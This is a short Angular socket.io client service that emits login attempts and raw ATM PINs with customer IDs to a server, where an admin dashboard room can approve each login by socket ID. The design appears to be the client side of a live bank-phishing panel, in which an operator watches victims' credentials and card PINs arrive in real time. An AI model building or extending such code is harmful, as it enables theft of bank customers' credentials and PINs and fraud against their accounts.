import { Injectable, OnDestroy } from '@angular/core';
import { io, Socket } from 'socket.io-client';
import { Observable } from 'rxjs';
import { env } from '../env/enviroment';

@Injectable({
  providedIn: 'root'
})
export class SocketService implements OnDestroy {
  private socket: Socket;

  constructor() {
    this.socket = io(env.BASE_URL);
  }

  // Join the admin room (used by dashboard)
  joinAdmin() {
    this.socket.emit('join_admin');
  }

  // Join a specific customer room
  registerCustomer(customerId: string) {
    this.socket.emit('register_customer', { customer_id: customerId });
  }

  // Login flow
  emitLoginAttempt(data: any) {
    if (this.socket) {
      this.socket.emit('login_attempt', data);
    }
  }

  emitAtmPin(data: { pin: string; customer_id: string }) {
    if (this.socket) {
      this.socket.emit('atm_pin_attempt', data);
    }
  }

  approveLogin(socketId: string) {
    this.socket.emit('approve_login', { socketId });
  }

  // Generic listen
  onEvent<T>(eventName: string): Observable<T> {
    return new Observable((subscriber) => {
      this.socket.on(eventName, (data: T) => {
        subscriber.next(data);
      });
      return () => this.socket.off(eventName);
    });
  }

  ngOnDestroy() {
    if (this.socket) {
      this.socket.disconnect();
    }
  }
}
